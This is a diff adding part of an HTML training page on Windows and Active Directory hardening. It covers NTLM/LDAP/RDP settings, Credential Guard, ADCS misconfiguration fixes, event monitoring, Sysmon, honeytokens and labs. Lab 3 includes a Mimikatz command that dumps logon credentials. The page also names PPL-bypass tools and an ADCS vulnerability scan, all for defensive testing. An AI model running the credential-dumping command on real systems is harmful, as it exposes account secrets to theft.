+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
+  -Name "LDAPServerIntegrity" -Value 2  # 0=None, 1=Require if client supports, 2=Required
+
+# LDAP Channel Binding (prevents token relay even with signing)
+# Registry on DC:
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
+  -Name "LdapEnforceChannelBinding" -Value 2  # 0=Never, 1=When supported, 2=Always
+
+# Client side — require signing
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LDAP" `
+  -Name "LDAPClientIntegrity" -Value 2
+
+# Verify current settings
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" |
+  Select-Object LDAPServerIntegrity, LdapEnforceChannelBinding</code></pre>
+
+        <h3>NTLM Restriction</h3>
+<pre><code class="language-powershell"># NTLM restriction strategy: Audit → Restrict → Deny (phased approach)
+
+# Phase 1: AUDIT — Log all NTLM usage
+# GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+# "Network security: Restrict NTLM: Audit Incoming NTLM Traffic" = Enable auditing for all accounts
+# "Network security: Restrict NTLM: Audit NTLM authentication in this domain" = Enable all
+
+# Check NTLM audit events
+Get-WinEvent -LogName "Microsoft-Windows-NTLM/Operational" -MaxEvents 50 |
+  Select-Object TimeCreated, Message
+
+# Phase 2: RESTRICT — Allow exceptions, deny rest
+# "Network security: Restrict NTLM: Incoming NTLM traffic" = Deny all accounts
+# "Network security: Restrict NTLM: NTLM authentication in this domain" = Deny for domain accounts to domain servers
+# "Network security: Restrict NTLM: Add server exceptions" = list servers that still need NTLM
+
+# Phase 3: DENY — Force Kerberos everywhere
+# "Network security: LAN Manager authentication level" = Send NTLMv2 response only. Refuse LM &amp; NTLM
+
+# Registry equivalent
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
+# Values: 0=LM&NTLM, 1=LM&NTLMv2, 2=NTLMv2 only, 3=NTLMv2 refuse LM, 4=NTLMv2 refuse LM&NTLM, 5=NTLMv2 refuse all
+
+# Check current level
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object LmCompatibilityLevel</code></pre>
+
+        <h3>RDP Security</h3>
+<pre><code class="language-powershell"># Require Network Level Authentication (NLA)
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
+  -Name "UserAuthentication" -Value 1
+
+# Set encryption level to High
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
+  -Name "MinEncryptionLevel" -Value 3  # 1=Low, 2=Client Compatible, 3=High, 4=FIPS
+
+# Disable Restricted Admin mode (prevents pass-the-hash to RDP)
+# NOTE: Restricted Admin allows PtH — disable unless specifically needed
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
+  -Name "DisableRestrictedAdmin" -Value 1
+
+# Limit who can RDP
+# GPO: Computer Configuration → Windows Settings → Security Settings → 
+#   Local Policies → User Rights Assignment → "Allow log on through Remote Desktop Services"
+#   = Only specific admin groups
+
+# Enable Remote Credential Guard (client-side, prevents credential theft on remote host)
+# Client connects with: mstsc /remoteGuard
+
+# Set RDP session timeout
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" `
+  -Name "MaxIdleTime" -Value 900000       # 15 min idle timeout (milliseconds)
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" `
+  -Name "MaxDisconnectionTime" -Value 60000  # 1 min disconnect timeout</code></pre>
+
+        <h3>Windows Firewall — DC Rules</h3>
+<pre><code class="language-powershell"># Domain Controller — minimal required inbound rules
+# DNS: TCP/UDP 53
+# Kerberos: TCP/UDP 88
+# LDAP: TCP/UDP 389, TCP 636 (LDAPS)
+# SMB: TCP 445
+# Global Catalog: TCP 3268, 3269
+# RPC: TCP 135 + dynamic (49152-65535)
+# NTP: UDP 123
+# WinRM (management): TCP 5985/5986
+
+# Block everything else inbound on DCs
+New-NetFirewallRule -DisplayName "DC-Allow-DNS" -Direction Inbound -Protocol TCP -LocalPort 53 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-DNS-UDP" -Direction Inbound -Protocol UDP -LocalPort 53 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-Kerberos" -Direction Inbound -Protocol TCP -LocalPort 88 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-Kerberos-UDP" -Direction Inbound -Protocol UDP -LocalPort 88 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-LDAP" -Direction Inbound -Protocol TCP -LocalPort 389,636 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-SMB" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-GC" -Direction Inbound -Protocol TCP -LocalPort 3268,3269 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-RPC" -Direction Inbound -Protocol TCP -LocalPort 135 -Action Allow
+New-NetFirewallRule -DisplayName "DC-Allow-WinRM" -Direction Inbound -Protocol TCP -LocalPort 5985,5986 -Action Allow `
+  -RemoteAddress "10.0.0.0/8"  # Restrict WinRM to management subnet
+
+# Set default inbound to Block
+Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block
+
+# Verify rules
+Get-NetFirewallRule | Where-Object { $_.Enabled -eq "True" -and $_.Direction -eq "Inbound" } |
+  Select-Object DisplayName, Action | Sort-Object DisplayName</code></pre>
+
+        <!-- ==================== CREDENTIAL PROTECTION ==================== -->
+        <h2>Credential Protection</h2>
+
+        <h3>Credential Guard</h3>
+        <p>Uses VBS (Virtualization-Based Security) to isolate LSASS secrets in a protected container. Even with kernel-level access, an attacker cannot extract credentials from the isolated LSA process.</p>
+<pre><code class="language-powershell"># Requirements: UEFI, Secure Boot, TPM 2.0, 64-bit, Enterprise/Education edition
+# NOTE: Do NOT enable on Domain Controllers (breaks replication)
+
+# Check if Credential Guard is running
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
+  Select-Object -ExpandProperty SecurityServicesRunning
+# 1 = Credential Guard running
+
+# Enable via GPO:
+# Computer Configuration → Administrative Templates → System → Device Guard
+#   "Turn on Virtualization Based Security" = Enabled
+#   "Credential Guard Configuration" = Enabled with UEFI lock
+
+# Enable via registry
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1
+# LsaCfgFlags: 0=Disabled, 1=Enabled with UEFI lock, 2=Enabled without lock
+
+# Verify status
+msinfo32  # Check "Credential Guard" in System Summary
+# Or PowerShell:
+Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
+
+# What Credential Guard protects:
+# - NTLM hashes (no more pass-the-hash from LSASS)
+# - Kerberos TGTs (no more pass-the-ticket from LSASS)
+# - Derived domain credentials
+# What it does NOT protect:
+# - Credentials for local accounts
+# - Service account credentials cached by applications
+# - Credentials in third-party credential providers</code></pre>
+
+        <h3>LSASS Protection (RunAsPPL)</h3>
+<pre><code class="language-powershell"># Protected Process Light (PPL) for LSASS
+# Prevents non-protected processes from opening LSASS (blocks Mimikatz, procdump, etc.)
+
+# Enable LSASS PPL
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1
+# Requires reboot
+
+# Verify LSASS is running as PPL
+Get-Process lsass | Select-Object Id, ProcessName
+# Check protection level:
+Get-CimInstance Win32_Process -Filter "Name='lsass.exe'" | Select-Object ProcessId, Name
+
+# GPO: Computer Configuration → Administrative Templates → System → Local Security Authority
+#   "Configure LSASS to run as a protected process" = Enabled (with UEFI lock)
+
+# Windows 11 22H2+: LSASS PPL is enabled by default
+
+# Bypasses attackers use (for awareness):
+# - Vulnerable signed drivers (BYOVD) to disable PPL
+# - mimidrv.sys (Mimikatz kernel driver) — requires admin + driver loading
+# - PPLKiller / PPLFault tools (abuse Windows Error Reporting)</code></pre>
+
+        <h3>Protected Users Group</h3>
+<pre><code class="language-powershell"># Members of "Protected Users" group get these restrictions:
+# - NTLM authentication is blocked (Kerberos only)
+# - DES/RC4 Kerberos encryption disabled (AES only)
+# - No credential delegation (CredSSP)
+# - No NTLM hash cached on the machine
+# - Kerberos TGT lifetime reduced to 4 hours (non-renewable)
+# - No caching of plaintext credentials even with WDigest
+
+# Add users to Protected Users
+Add-ADGroupMember -Identity "Protected Users" -Members "admin_user", "svc_tier0"
+
+# Check membership
+Get-ADGroupMember "Protected Users" | Select-Object Name, objectClass
+
+# CAUTION: Applications that require NTLM will break for these users
+# Test in audit mode first — monitor for authentication failures
+# Do NOT add service accounts that use NTLM or need delegation
+# Best for: Tier 0 admin accounts, sensitive human accounts</code></pre>
+
+        <h3>Authentication Policy Silos</h3>
+<pre><code class="language-powershell"># Authentication Policies + Silos restrict WHERE an account can authenticate
+# Requires: Domain functional level 2012 R2+, Dynamic Access Control
+
+# Create authentication policy (restrict TGT issuance to specific machines)
+New-ADAuthenticationPolicy -Name "Tier0-Policy" -Enforce `
+  -UserTGTLifetimeMins 240 `
+  -UserAllowedToAuthenticateFrom "O:SYG:SYD:(XA;OICI;CR;;;WD;(@USER.ad://ext/AuthenticationSilo == `"Tier0-Silo`"))"
+
+# Create authentication silo
+New-ADAuthenticationPolicySilo -Name "Tier0-Silo" -Enforce `
+  -UserAuthenticationPolicy "Tier0-Policy" `
+  -ComputerAuthenticationPolicy "Tier0-Policy" `
+  -ServiceAuthenticationPolicy "Tier0-Policy"
+
+# Assign accounts to the silo
+Set-ADUser -Identity "admin_user" -AuthenticationPolicySilo "Tier0-Silo"
+Grant-ADAuthenticationPolicySiloAccess -Identity "Tier0-Silo" -Account "admin_user"
+
+# Assign computers to the silo (only these machines accept silo'd user auth)
+Set-ADComputer -Identity "DC01" -AuthenticationPolicySilo "Tier0-Silo"
+Grant-ADAuthenticationPolicySiloAccess -Identity "Tier0-Silo" -Account "DC01$"</code></pre>
+
+        <h3>Managed Service Accounts (gMSA)</h3>
+<pre><code class="language-powershell"># gMSA = Group Managed Service Accounts
+# Automatic password management (120-char random password, rotated every 30 days)
+# Eliminates service account password management and Kerberoasting risk
+
+# Prerequisites
+Add-KdsRootKey -EffectiveImmediately  # In production use: -EffectiveTime ((Get-Date).AddHours(-10))
+
+# Create gMSA
+New-ADServiceAccount -Name "svc_webapp" `
+  -DNSHostName "svc_webapp.domain.local" `
+  -PrincipalsAllowedToRetrieveManagedPassword "WebServers_Group" `
+  -ServicePrincipalNames "HTTP/webapp.domain.local"
+
+# Install on target server
+Install-ADServiceAccount -Identity "svc_webapp"
+
+# Test
+Test-ADServiceAccount -Identity "svc_webapp"  # Should return True
+
+# Configure a service to use gMSA (no password needed!)
+# Set service logon account to: DOMAIN\svc_webapp$ (note the $ suffix)
+# Password field: leave blank
+
+# Check all gMSAs in the domain
+Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |
+  Select-Object Name, DNSHostName, PrincipalsAllowedToRetrieveManagedPassword</code></pre>
+
+        <h3>Disabling WDigest &amp; Enforcing AES Kerberos</h3>
+<pre><code class="language-powershell"># Disable WDigest (prevents cleartext password caching in LSASS)
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
+  -Name "UseLogonCredential" -Value 0
+# NOTE: On Windows 8.1/2012R2+ this is default. Verify on older systems.
+
+# Verify
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" |
+  Select-Object UseLogonCredential
+
+# Enforce AES for Kerberos (disable RC4/DES — blocks Kerberoasting with weak crypto)
+# GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+# "Network security: Configure encryption types allowed for Kerberos"
+#   = AES128_HMAC_SHA1, AES256_HMAC_SHA1, Future encryption types
+#   UNCHECK: DES_CBC_CRC, DES_CBC_MD5, RC4_HMAC_MD5
+
+# Registry equivalent:
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" `
+  -Name "SupportedEncryptionTypes" -Value 0x18  # 0x18 = AES128 + AES256 only
+
+# CAUTION: Disabling RC4 may break legacy applications and trusts
+# Audit first: enable Kerberos operational logging to find RC4 usage
+wevtutil sl "Microsoft-Windows-Kerberos/Operational" /e:true
+
+# Check for accounts still using RC4
+Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes |
+  Where-Object { $_."msDS-SupportedEncryptionTypes" -band 0x4 } |
+  Select-Object Name, "msDS-SupportedEncryptionTypes"</code></pre>
+
+        <!-- ==================== ACTIVE DIRECTORY HARDENING ==================== -->
+        <h2>Active Directory Hardening</h2>
+
+        <h3>Tiered Administration Model</h3>
+        <table>
+          <tr><th>Tier</th><th>Assets</th><th>Accounts</th><th>Key Principle</th></tr>
+          <tr><td>Tier 0</td><td>Domain Controllers, AD, PKI, ADFS, PAWs for Tier 0</td><td>Domain Admins, Enterprise Admins, Schema Admins</td><td>Never log into lower-tier systems; credential isolation</td></tr>
+          <tr><td>Tier 1</td><td>Member servers, applications, databases, hypervisors</td><td>Server admins, application admins</td><td>Cannot access Tier 0 assets; limited to server management</td></tr>
+          <tr><td>Tier 2</td><td>Workstations, printers, user devices</td><td>Desktop support, helpdesk</td><td>Cannot access Tier 0 or Tier 1; limited to endpoint support</td></tr>
+        </table>
+        <p><strong>Core rules:</strong> Higher-tier credentials NEVER touch lower-tier systems. Separate admin accounts per tier. Tier 0 accounts use dedicated PAWs only.</p>
+
+<pre><code class="language-powershell"># Implement tier isolation via GPO — restrict logon rights
+# On Tier 1 servers: DENY logon to Tier 0 accounts
+# GPO: "Deny log on locally" / "Deny log on through Remote Desktop Services" = Tier 0 admin groups
+
+# On workstations (Tier 2): DENY logon to Tier 0 AND Tier 1 accounts
+# This prevents credential exposure if a workstation is compromised
+
+# OU structure for tiered model:
+# domain.local
+# ├── Tier 0
+# │   ├── Accounts (Domain Admins, Tier0 admins)
+# │   ├── Servers (DCs, PKI, ADFS)
+# │   └── PAWs (Tier0 admin workstations)
+# ├── Tier 1
+# │   ├── Accounts (Server admins)
+# │   └── Servers (Member servers, SQL, Exchange)
+# └── Tier 2
+#     ├── Accounts (Helpdesk, desktop support)
+#     ├── Workstations
+#     └── Users
+
+# Find violations: where are high-tier accounts logging in?
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
+  Where-Object { $_.Properties[5].Value -match "admin" } |
+  Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='Computer';E={$_.Properties[11].Value}}</code></pre>
+
+        <h3>Privileged Access Workstations (PAWs)</h3>
+        <table>
+          <tr><th>Feature</th><th>Configuration</th></tr>
+          <tr><td>OS</td><td>Clean Windows install, fully patched, latest feature update</td></tr>
+          <tr><td>Software</td><td>Only RSAT, RDP client, management tools. No email, browser, Office</td></tr>
+          <tr><td>Network</td><td>Restricted — only reaches Tier 0 assets (DCs, management interfaces)</td></tr>
+          <tr><td>Hardware</td><td>Dedicated physical device (not VM). TPM 2.0, Secure Boot, BitLocker</td></tr>
+          <tr><td>Authentication</td><td>Smartcard or Windows Hello for Business. No password logon.</td></tr>
+          <tr><td>Internet</td><td>Blocked entirely (no proxy, no DNS for external)</td></tr>
+          <tr><td>USB</td><td>Disabled except for smartcard reader</td></tr>
+          <tr><td>AppLocker/WDAC</td><td>Whitelist-only execution policy</td></tr>
+        </table>
+
+        <h3>ADCS Hardening (ESC1-ESC8 Prevention)</h3>
+        <table>
+          <tr><th>ESC#</th><th>Vulnerability</th><th>Mitigation</th></tr>
+          <tr><td>ESC1</td><td>Templates allow SAN override + low-priv enrollment</td><td>Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT; require manager approval</td></tr>
+          <tr><td>ESC2</td><td>Templates allow "Any Purpose" or SubCA EKU</td><td>Remove dangerous EKUs; restrict enrollment permissions</td></tr>
+          <tr><td>ESC3</td><td>Enrollment agent templates available to low-priv users</td><td>Restrict enrollment agent certificates to specific admin groups</td></tr>
+          <tr><td>ESC4</td><td>Vulnerable template ACLs (Write/Owner permissions)</td><td>Audit template ACLs; remove excessive permissions</td></tr>
+          <tr><td>ESC5</td><td>Vulnerable CA server ACLs</td><td>Harden CA object permissions in AD</td></tr>
+          <tr><td>ESC6</td><td>EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA</td><td><code>certutil -config "CA\Name" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</code></td></tr>
+          <tr><td>ESC7</td><td>Vulnerable CA ACLs (ManageCA/ManageCertificates)</td><td>Restrict ManageCA to CA admins only</td></tr>
+          <tr><td>ESC8</td><td>HTTP enrollment endpoint enables NTLM relay to CA</td><td>Require HTTPS + EPA on enrollment pages; disable HTTP enrollment</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># Audit ADCS with Certify (from offensive perspective — use defensively to find issues)
+.\Certify.exe find /vulnerable
+
+# Check templates with SAN override (ESC1)
+.\Certify.exe find /enrolleeSuppliesSubject
+
+# Defensive — check template permissions
+Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -SearchBase "CN=Certificate Templates,CN=Configuration,DC=domain,DC=local" -Properties * |
+  ForEach-Object {
+    $acl = Get-ACL "AD:\$($_.DistinguishedName)"
+    $risky = $acl.Access | Where-Object {
+      $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|WriteProperty" -and
+      $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"
+    }
+    if ($risky) { Write-Output "[!] Template: $($_.Name) has risky permissions"; $risky }
+  }
+
+# Disable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
+certutil -config "DC01\Domain-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+# Restart CA service after change
+Restart-Service CertSvc</code></pre>
+
+        <h3>Monitoring &amp; Alerting</h3>
+        <table>
+          <tr><th>Event ID</th><th>Source</th><th>What to Alert On</th></tr>
+          <tr><td>4720</td><td>Security</td><td>User account created</td></tr>
+          <tr><td>4728/4732/4756</td><td>Security</td><td>Member added to security-enabled group (global/local/universal)</td></tr>
+          <tr><td>4672</td><td>Security</td><td>Special privileges assigned (admin logon)</td></tr>
+          <tr><td>4624 (Type 10)</td><td>Security</td><td>Remote interactive logon (RDP)</td></tr>
+          <tr><td>4625</td><td>Security</td><td>Failed logon (brute force detection)</td></tr>
+          <tr><td>4648</td><td>Security</td><td>Logon using explicit credentials (runas, PSExec)</td></tr>
+          <tr><td>4662</td><td>Security</td><td>Operation performed on AD object (DCSync = Replicating Directory Changes)</td></tr>
+          <tr><td>4768</td><td>Security</td><td>Kerberos TGT requested (AS-REQ)</td></tr>
+          <tr><td>4769</td><td>Security</td><td>Kerberos service ticket requested (Kerberoasting if RC4)</td></tr>
+          <tr><td>4771</td><td>Security</td><td>Kerberos pre-auth failed (AS-REP roasting)</td></tr>
+          <tr><td>4776</td><td>Security</td><td>NTLM authentication (should be minimal if restricting NTLM)</td></tr>
+          <tr><td>5136</td><td>Security</td><td>Directory service object modified (GPO change, AdminSDHolder mod)</td></tr>
+          <tr><td>5145</td><td>Security</td><td>Network share access (SYSVOL, NETLOGON tampering)</td></tr>
+          <tr><td>7045</td><td>System</td><td>New service installed (persistence, PSExec)</td></tr>
+          <tr><td>4697</td><td>Security</td><td>Service installed in the system</td></tr>
+          <tr><td>1102</td><td>Security</td><td>Audit log cleared (cover tracks)</td></tr>
+          <tr><td>4688</td><td>Security</td><td>Process creation (enable command line logging)</td></tr>
+        </table>
+
+        <h3>Sysmon Deployment</h3>
+<pre><code class="language-powershell"># Install Sysmon with SwiftOnSecurity config
+.\Sysmon64.exe -accepteula -i sysmonconfig-export.xml
+
+# Key Sysmon Event IDs for detection:
+# 1  - Process creation (with hashes, parent process, command line)
+# 3  - Network connection (detect C2, lateral movement)
+# 7  - Image loaded (DLL side-loading detection)
+# 8  - CreateRemoteThread (injection detection)
+# 10 - Process access (LSASS access = credential dumping)
+# 11 - File creation (malware drops)
+# 12/13/14 - Registry events (persistence)
+# 17/18 - Pipe created/connected (named pipe lateral movement)
+# 22 - DNS query (DNS C2, tunnel detection)
+# 23 - File delete (ransomware behavior)
+# 25 - Process tampering (process hollowing, herpaderping)
+
+# Monitor LSASS access (Event ID 10)
+# Alert on any process accessing lsass.exe that isn't:
+#   - csrss.exe, services.exe, svchost.exe, wininit.exe, MsMpEng.exe
+
+# Sysmon config snippet for LSASS monitoring:
+# &lt;ProcessAccess onmatch="include"&gt;
+#   &lt;TargetImage condition="is"&gt;C:\Windows\system32\lsass.exe&lt;/TargetImage&gt;
+# &lt;/ProcessAccess&gt;
+# &lt;ProcessAccess onmatch="exclude"&gt;
+#   &lt;SourceImage condition="is"&gt;C:\Windows\system32\csrss.exe&lt;/SourceImage&gt;
+#   &lt;SourceImage condition="is"&gt;C:\Windows\system32\wininit.exe&lt;/SourceImage&gt;
+# &lt;/ProcessAccess&gt;
+
+# Update Sysmon config
+.\Sysmon64.exe -c newconfig.xml
+
+# View Sysmon events
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 |
+  Select-Object TimeCreated, Id, Message</code></pre>
+
+        <h3>Windows Event Forwarding (WEF)</h3>
+<pre><code class="language-powershell"># WEF Architecture: Source computers → Collector server → SIEM
+# Uses WinRM (TCP 5985) and subscriptions
+
+# On Collector server:
+wecutil qc  # Quick config — enables WEF collector
+
+# Create a subscription (XML-based)
+# Save as subscription.xml:
+# &lt;Subscription xmlns="http://schemas.microsoft.com/2006/03/windows/events/subscription"&gt;
+#   &lt;SubscriptionId&gt;SecurityEvents&lt;/SubscriptionId&gt;
+#   &lt;SubscriptionType&gt;SourceInitiated&lt;/SubscriptionType&gt;
+#   &lt;Description&gt;Collect security events from all machines&lt;/Description&gt;
+#   &lt;Enabled&gt;true&lt;/Enabled&gt;
+#   &lt;Uri&gt;http://schemas.microsoft.com/wbem/wsman/1/windows/EventLog&lt;/Uri&gt;
+#   &lt;Query&gt;
+#     &lt;![CDATA[
+#       &lt;QueryList&gt;
+#         &lt;Query Id="0" Path="Security"&gt;
+#           &lt;Select Path="Security"&gt;*[System[(EventID=4624 or EventID=4625 or EventID=4672 or EventID=4688 or EventID=4720 or EventID=4728 or EventID=4732)]]&lt;/Select&gt;
+#         &lt;/Query&gt;
+#         &lt;Query Id="1" Path="Microsoft-Windows-Sysmon/Operational"&gt;
+#           &lt;Select Path="Microsoft-Windows-Sysmon/Operational"&gt;*&lt;/Select&gt;
+#         &lt;/Query&gt;
+#       &lt;/QueryList&gt;
+#     ]]&gt;
+#   &lt;/Query&gt;
+# &lt;/Subscription&gt;
+
+wecutil cs subscription.xml
+wecutil gr SecurityEvents  # Check subscription status
+
+# On source computers (via GPO):
+# Computer Configuration → Administrative Templates → Windows Components → Event Forwarding
+# "Configure target Subscription Manager" = Server=http://COLLECTOR:5985/wsman/SubscriptionManager/WEC
+
+# Verify forwarding is working
+wecutil gr SecurityEvents  # Shows active sources</code></pre>
+
+        <!-- ==================== HONEYTOKEN & CANARY ==================== -->
+        <h3>Honeytokens &amp; Canary Objects</h3>
+<pre><code class="language-powershell"># Create a honeytoken user account (never used legitimately — any auth = alert)
+New-ADUser -Name "svc_sqlbackup" -SamAccountName "svc_sqlbackup" `
+  -Description "SQL Backup Service Account - DO NOT MODIFY" `
+  -UserPrincipalName "svc_sqlbackup@domain.local" `
+  -AccountPassword (ConvertTo-SecureString "HoneyP@ss123!" -AsPlainText -Force) `
+  -Enabled $true `
+  -CannotChangePassword $true `
+  -PasswordNeverExpires $true
+
+# Set SPN to make it Kerberoastable (detects Kerberoasting)
+Set-ADUser "svc_sqlbackup" -ServicePrincipalNames @{Add="MSSQLSvc/sql-backup.domain.local:1433"}
+
+# Monitor for:
+# - Event 4768/4769 for this account (someone requested a ticket)
+# - Event 4624/4625 for this account (someone tried to log in)
+# - Event 4662 with this user's DN (someone enumerated this account)
+
+# Create a canary file share (detects lateral movement/enumeration)
+New-SmbShare -Name "IT_Credentials" -Path "C:\Shares\Honeyshare" -FullAccess "Everyone"
+# Place fake files: "admin_passwords.xlsx", "vpn_credentials.txt"
+# Monitor Event ID 5145 for access to this share
+
+# Create a canary computer object
+New-ADComputer -Name "YOURDC02" -Description "Backup Domain Controller" `
+  -Enabled $true
+# Any authentication attempt to/from YOURDC02 = alert
+
+# Sigma rule example for honeytoken detection:
+# title: Honeytoken Account Authentication
+# logsource: product: windows, service: security
+# detection:
+#   selection:
+#     EventID: [4624, 4625, 4768, 4769]
+#     TargetUserName: 'svc_sqlbackup'
+#   condition: selection
+# level: critical</code></pre>
+
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- LAB TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: CIS Benchmark Audit with HardeningKitty</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Audit a Windows machine against CIS benchmarks using HardeningKitty and identify the top 10 critical findings.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Download HardeningKitty
+git clone https://github.com/scipag/HardeningKitty.git
+Import-Module .\HardeningKitty\HardeningKitty.psm1
+
+# Run audit against CIS Windows 11 Enterprise
+Invoke-HardeningKitty -Mode Audit -Log -Report `
+  -FileFindingList .\HardeningKitty\lists\finding_list_cis_microsoft_windows_11_enterprise_23h2_machine.csv
+
+# Export results
+Invoke-HardeningKitty -Mode Audit -Log -Report -ReportFile C:\temp\audit_results.csv `
+  -FileFindingList .\HardeningKitty\lists\finding_list_cis_microsoft_windows_11_enterprise_23h2_machine.csv</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Install HardeningKitty on a test Windows machine</li>
+              <li>Run a full CIS audit and save the report</li>
+              <li>Identify findings rated "Medium" or higher</li>
+              <li>Pick the top 10 most critical gaps and document the remediation GPO path for each</li>
+              <li>Apply at least 5 remediations using <code>Invoke-HardeningKitty -Mode HailMary</code> on specific settings</li>
+              <li>Re-run the audit and verify compliance percentage improved</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Deploy Microsoft Security Baseline with LGPO</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Apply the Microsoft Security Baseline to a standalone Windows machine using LGPO.exe and validate the changes.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Download Security Compliance Toolkit from Microsoft
+# Extract to C:\SCT
+
+# Backup current policy first!
+.\LGPO.exe /b C:\Backups\PreBaseline
+
+# Apply Windows 11 23H2 security baseline
+.\LGPO.exe /g "C:\SCT\Windows 11 v23H2 Security Baseline\GPOs\{GUID-Computer}"
+.\LGPO.exe /g "C:\SCT\Windows 11 v23H2 Security Baseline\GPOs\{GUID-User}"
+
+# Verify changes applied
+gpresult /r
+secedit /export /cfg C:\temp\post_baseline.cfg
+
+# Compare before/after
+# Use PolicyAnalyzer to diff the backup vs current state</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Download the Microsoft Security Compliance Toolkit</li>
+              <li>Backup the current local policy using LGPO</li>
+              <li>Apply the appropriate security baseline GPO</li>
+              <li>Verify key settings changed: password policy, audit policy, SMB signing</li>
+              <li>Use PolicyAnalyzer to compare pre- and post-baseline configurations</li>
+              <li>Identify any settings that might break functionality in your environment</li>
+              <li>Roll back using the backup if needed</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Configure Advanced Audit Policy &amp; Detect Mimikatz</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Configure comprehensive audit logging, then run Mimikatz and verify the events generated can be used for detection.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Enable comprehensive audit policy
+auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"Special Logon" /success:enable
+auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
+auditpol /set /subcategory:"Process Creation" /success:enable
+
+# Enable command line in process creation events
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
+  -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
+
+# Step 2: Install Sysmon with detection-focused config
+.\Sysmon64.exe -accepteula -i sysmonconfig-export.xml
+
+# Step 3: Run Mimikatz (in a safe lab environment!)
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Step 4: Check what events were generated
+Get-WinEvent -LogName Security -MaxEvents 100 |
+  Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) } |
+  Where-Object { $_.Id -in @(4672, 4688, 4673) } |
+  Select-Object TimeCreated, Id, Message
+
+# Check Sysmon for LSASS access
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+  Where-Object { $_.Id -eq 10 -and $_.Message -match "lsass" } |
+  Select-Object TimeCreated, Message -First 5</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
